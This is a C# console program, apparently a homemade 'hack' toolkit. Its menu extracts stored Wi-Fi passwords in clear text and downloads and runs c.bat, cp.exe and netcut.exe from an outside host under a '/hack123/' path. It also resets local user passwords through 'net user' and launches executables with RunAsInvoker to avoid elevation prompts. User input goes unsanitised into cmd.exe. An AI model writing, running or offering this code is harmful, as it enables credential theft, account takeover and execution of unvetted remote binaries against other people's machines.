using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;

class Program
{
    private const string Version = "1.2.0";

    static void Main(string[] args)
    {
        string[] options = {
            "Retrieve Wi-Fi Password",
            "Download and Run c.bat",
            "Download and Run cp.exe",
            "Download and Run netcut.exe",
            "Change User Password",
            "Run .exe without Admin Privileges",
            "Exit"
        };
        int selectedIndex = 0;
        Console.CursorVisible = false;

        while (true)
        {
            DrawMenu(options, selectedIndex);
            var key = Console.ReadKey(true).Key;

            switch (key)
            {
                case ConsoleKey.UpArrow: selectedIndex = (selectedIndex == 0) ? options.Length - 1 : selectedIndex - 1; break;
                case ConsoleKey.DownArrow: selectedIndex = (selectedIndex == options.Length - 1) ? 0 : selectedIndex + 1; break;
                case ConsoleKey.Enter: Console.Clear(); HandleOption(selectedIndex); break;
            }
        }
    }

    static void DrawMenu(string[] options, int selectedIndex)
    {
        Console.Clear();
        for (int i = 0; i < options.Length; i++)
        {
            Console.BackgroundColor = (i == selectedIndex) ? ConsoleColor.White : ConsoleColor.Black;
            Console.ForegroundColor = (i == selectedIndex) ? ConsoleColor.Black : ConsoleColor.White;
            Console.WriteLine($"  {options[i]}  ");
        }
        Console.ResetColor();
    }

    static void HandleOption(int index)
    {
        switch (index)
        {
            case 0: RetrieveWifiPassword(); break;
            case 1: DownloadAndRun("http://cekkistorage.cekuj.net/c.bat", "c.bat"); break;
            case 2: DownloadAndRun("http://cekkistorage.cekuj.net/hack123/cp.exe", "cp.exe"); break;
            case 3: DownloadAndRun("http://cekkistorage.cekuj.net/hack123/netcut.exe", "netcut.exe"); break;
            case 4: ChangeUserPassword(); break;
            case 5: CreateAndRunBatch(); break;
            case 6: Console.WriteLine("Exiting..."); Environment.Exit(0); break;
        }
    }

    static void RetrieveWifiPassword()
    {
        Console.WriteLine("Retrieving Wi-Fi profiles...");
        ExecuteCommand("netsh wlan show profiles", out string profiles, out _);

        Console.WriteLine(profiles);
        Console.Write("Enter Wi-Fi name (SSID) to retrieve password: ");
        string wifiName = Console.ReadLine();

        ExecuteCommand($"netsh wlan show profile name=\"{wifiName}\" key=clear", out string output, out _);
        string password = ExtractKeyContent(output);

        Console.WriteLine(password != null ? $"Wi-Fi Password: {password}" : "Password not found.");
        Console.ReadKey();
    }

    static void DownloadAndRun(string url, string fileName)
    {
        Console.WriteLine($"Downloading and running {fileName}...");
        try
        {
            using (var client = new WebClient()) client.DownloadFile(url, fileName);
            Process.Start(fileName);
        }
        catch (Exception ex) { Console.WriteLine($"Error: {ex.Message}"); }
        Console.ReadKey();
    }

    static void CreateAndRunBatch()
    {
        Console.Write("Enter the path to the .exe file: ");
        string exePath = Console.ReadLine();

        if (!File.Exists(exePath) || Path.GetExtension(exePath).ToLower() != ".exe")
        {
            Console.WriteLine("Invalid .exe file path.");
            Console.ReadKey();
            return;
        }

        string batPath = $"install-{Path.GetFileNameWithoutExtension(exePath)}.bat";
        File.WriteAllText(batPath, $"set __COMPAT_LAYER=RunAsInvoker\nstart \"\" \"{exePath}\"");

        try
        {
            Process.Start(batPath).WaitForExit();
            File.Delete(batPath);
            Console.WriteLine("Batch file executed and deleted.");
        }
        catch (Exception ex) { Console.WriteLine($"Error: {ex.Message}"); }
        Console.ReadKey();
    }

    static void ChangeUserPassword()
    {
        if (!IsAdministrator())
        {
            Console.WriteLine("Restarting with administrator privileges...");
            RestartWithAdminPrivileges();
            return;
        }

        Console.WriteLine("User accounts:");
        ExecuteCommand("net user", out string users, out _);
        Console.WriteLine(users);

        Console.Write("Enter username: ");
        string username = Console.ReadLine();
        Console.Write("Enter new password: ");
        string password = Console.ReadLine();

        ExecuteCommand($"net user {username} {password}", out string output, out string error);
        Console.WriteLine(string.IsNullOrWhiteSpace(error) ? "Password changed successfully." : $"Error: {error}");
        Console.ReadKey();
    }

    static void ExecuteCommand(string command, out string output, out string error)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();
        output = process.StandardOutput.ReadToEnd();
        error = process.StandardError.ReadToEnd();
        process.WaitForExit();
    }

    static string ExtractKeyContent(string input)
    {
        foreach (var line in input.Split('\n'))
            if (line.Contains("Key Content"))
                return line.Split(':')[1].Trim();
        return null;
    }

    static bool IsAdministrator()
    {
        var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    static void RestartWithAdminPrivileges()
    {
        try
        {
            var processInfo = new ProcessStartInfo
            {
                FileName = Process.GetCurrentProcess().MainModule.FileName,
                UseShellExecute = true,
                Verb = "runas"
            };
            Process.Start(processInfo);
        }
        catch (Exception ex) { Console.WriteLine($"Error: {ex.Message}"); }
    }
}
